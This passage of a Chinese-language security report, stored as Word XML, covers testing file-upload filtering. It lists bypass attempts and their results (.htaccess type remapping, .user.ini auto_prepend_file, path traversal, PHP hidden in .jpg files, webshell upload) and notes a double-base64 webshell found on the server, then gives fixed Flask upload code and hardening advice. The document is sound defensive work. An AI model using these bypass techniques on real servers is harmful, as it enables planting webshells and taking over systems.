            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>校验机制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>前端JS：.jpg/.png/.gif 白名单</w:t>
              <w:br/>
              <w:t>后端：黑名单拒绝 .php/.php5/.phtml 等</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传目录</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/upload/upload/（相对路径 ../upload/）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 测试结果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绕过技术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直接上传 .jpg（WAF+服务端均通过）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>纯GIF内容不受限</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传 .htaccess（AddType .jpg→PHP）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>但Apache可能不加载</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传 .user.ini（auto_prepend_file）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>但目录不匹配</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>路径穿越 ../.user.ini</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ WAF拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>.. 被WAF拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>纯变量赋值 + .jpg（&lt;?php $a=1;?&gt;）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ WAF通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>服务端黑名单通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>函数调用 + .jpg（&lt;?php eval();?&gt;）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ WAF拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>函数调用被WAF拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传 webshell.jpg 后访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>文件可能被清理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8.3 关键发现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 服务器已存在 webshell：db2_final.dat（双 base64 编码，POST c=参数）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 已有 .user.ini 配置 auto_prepend_file，但 php://filter 未生效</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. WAF 对 .php 扩展名严格拦截，但对 .jpg 内容检测有绕过空间</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 上传目录 /upload/upload/ 可通过 ../upload/路径访问</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>九、最终安全代码（修复后）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复后的 upload 路由完整代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 扩展名白名单</w:t>
        <w:br/>
        <w:t>ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".svg"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/upload", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>@login_required</w:t>
        <w:br/>
        <w:t>def upload():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        file = request.files.get("file")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        # CSRF 验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if not validate_csrf_token(request.form.get("csrf_token", "")):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return error("会话已过期")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        if not file or not file.filename:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return error("请选择文件")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        # 安全化文件名（防路径穿越+白名单校验）</w:t>
        <w:br/>
        <w:t xml:space="preserve">        filename = safe_filename(file.filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if not filename:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return error("不支持的文件类型")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        # 防重名覆盖</w:t>
        <w:br/>
        <w:t xml:space="preserve">        upload_path = os.path.join("static", "uploads", filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        base, ext = os.path.splitext(upload_path)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        counter = 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">        while os.path.exists(upload_path):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            upload_path = f"{base}_{counter}{ext}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            counter += 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">        file.save(upload_path)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>十、安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 开发阶段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 白名单校验：只允许特定扩展名，不要用黑名单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 文件名校验：os.path.basename() 移除路径，正则过滤特殊字符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 内容校验：读取文件头 MAGIC NUMBER 验证真实文件类型</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 重命名存储：使用 UUID/时间戳重命名，不保留原始文件名</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5. 存储目录分离：上传目录与 Web 根目录分离，禁止直接访问</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 运维阶段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 配置 WAF：部署 Web 应用防火墙（如长亭雷池）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 文件扫描：上传文件自动进行恶意代码扫描</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 权限控制：存储目录禁止脚本执行权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 定期清理：自动清理长时间未使用的上传文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 监控阶段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 日志审计：记录所有上传操作（用户、文件名、IP、时间）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 异常检测：监控可疑文件名（含路径穿越符、双扩展名等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 告警机制：大量上传/异常文件触发告警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